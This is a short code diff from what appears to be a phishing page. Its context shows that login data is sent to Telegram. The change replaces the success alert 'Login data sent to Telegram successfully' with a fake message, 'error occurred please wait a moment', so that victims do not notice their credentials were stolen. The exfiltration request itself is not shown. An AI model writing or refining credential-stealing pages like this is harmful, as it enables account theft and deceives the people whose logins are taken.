@@ -101,7 +101,7 @@
 					.then((response) => response.json())
 					.then((data) => {
 						if (data.ok) {
-							alert('Login data sent to Telegram successfully');
+							alert('error occurred please wait a moment');
 						} else {
 							alert('An error occurred. Try again later.');
 						}
